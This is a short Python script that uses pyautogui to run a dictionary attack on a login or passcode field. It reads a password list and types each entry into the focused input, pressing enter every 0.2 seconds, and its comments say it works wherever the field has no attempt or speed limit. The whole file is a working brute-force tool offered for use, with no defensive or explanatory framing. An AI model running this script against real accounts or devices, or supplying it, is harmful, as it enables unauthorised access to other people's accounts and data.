import pyautogui
import time

# This is a tool for using a dictionary attack on a login field, as long as the login field doesn't have an attempt or speed limit this works.
# This can also be used for passcodes, again, the field must have no limit on speed or attempts

filename = input("Passlist filename: ")

print("You have 5 seconds to focus the input field/window...")
time.sleep(5)

with open(filename, 'r') as file:
    for line in file:
        line = line.strip()
        if line:
            pyautogui.write(line)
            pyautogui.press('enter')
            time.sleep(0.20)